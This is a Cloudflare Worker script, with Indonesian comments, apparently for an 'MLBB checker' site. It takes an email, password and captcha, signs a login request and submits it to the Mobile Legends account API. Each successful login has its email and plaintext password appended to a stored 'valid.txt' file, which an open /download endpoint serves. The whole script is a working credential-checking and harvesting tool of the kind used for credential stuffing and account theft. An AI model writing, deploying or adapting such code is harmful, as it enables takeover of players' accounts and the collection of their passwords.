const ALLOWED_ORIGIN = "https://da85b9a2.mlbbchecker.pages.dev";  // Ganti dengan domain frontend kamu

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // Handle CORS preflight request
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
          "Access-Control-Max-Age": "86400",
        },
      });
    }

    // Helper buat response dengan CORS header
    function corsResponse(body, status = 200, contentType = "application/json") {
      return new Response(body, {
        status,
        headers: {
          "Content-Type": contentType,
          "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
          "Access-Control-Allow-Credentials": "true",
        },
      });
    }

    if (request.method === "POST" && url.pathname === "/check") {
      try {
        const contentType = request.headers.get("Content-Type") || "";
        let params;
        if (contentType.includes("application/json")) {
          params = await request.json();
        } else if (contentType.includes("application/x-www-form-urlencoded")) {
          const formData = await request.formData();
          params = {};
          for (const [k,v] of formData.entries()) params[k] = v;
        } else {
          return corsResponse(JSON.stringify({error:"Unsupported Content-Type"}), 415);
        }

        const { email, password, e_captcha } = params;
        if (!email || !password || !e_captcha) {
          return corsResponse(JSON.stringify({error:"Missing email, password or e_captcha"}), 400);
        }

        // MD5 hashing using Web Crypto API
        async function md5Hash(text) {
          const encoder = new TextEncoder();
          const data = encoder.encode(text);
          const hashBuffer = await crypto.subtle.digest('MD5', data);
          const hashArray = Array.from(new Uint8Array(hashBuffer));
          return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
        }

        async function generateSign(email, md5pwd, e_captcha) {
          const raw = `account=${email}&e_captcha=${e_captcha}&md5pwd=${md5pwd}&op=login_captcha`;
          return await md5Hash(raw);
        }

        const md5pwd = await md5Hash(password);
        const sign = await generateSign(email, md5pwd, e_captcha);

        const payload = {
          op: "login_captcha",
          lang: "en",
          sign,
          params: {
            account: email,
            md5pwd,
            e_captcha
          }
        };

        const apiResp = await fetch("https://accountmtapi.mobilelegends.com/", {
          method: "POST",
          headers: {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
            "Accept": "application/json",
          },
          body: JSON.stringify(payload)
        });

        if (!apiResp.ok) {
          return corsResponse(JSON.stringify({error: `HTTP error ${apiResp.status}`}), apiResp.status);
        }

        let data;
        try {
          data = await apiResp.json();
        } catch(e) {
          return corsResponse(JSON.stringify({error:"Invalid JSON from MLBB API"}), 502);
        }

        if(data.code === 0 && env.VALID_ACCOUNTS) {
          const line = `${email}|${password}\n`;
          let old = await env.VALID_ACCOUNTS.get("valid.txt") || "";
          old += line;
          await env.VALID_ACCOUNTS.put("valid.txt", old);
        }

        return corsResponse(JSON.stringify(data));

      } catch(e) {
        return corsResponse(JSON.stringify({error: e.toString()}), 500);
      }
    }

    if(request.method === "GET" && url.pathname === "/download") {
      if(!env.VALID_ACCOUNTS) {
        return corsResponse("KV namespace VALID_ACCOUNTS tidak tersedia", 500, "text/plain");
      }
      let filecontent = await env.VALID_ACCOUNTS.get("valid.txt");
      if(!filecontent) filecontent = "File valid.txt kosong.";

      return new Response(filecontent, {
        status: 200,
        headers: {
          "Content-Type": "text/plain",
          "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
          "Content-Disposition": "attachment; filename=valid.txt"
        }
      });
    }

    return corsResponse("Endpoint tidak ditemukan", 404, "text/plain");
  }
};
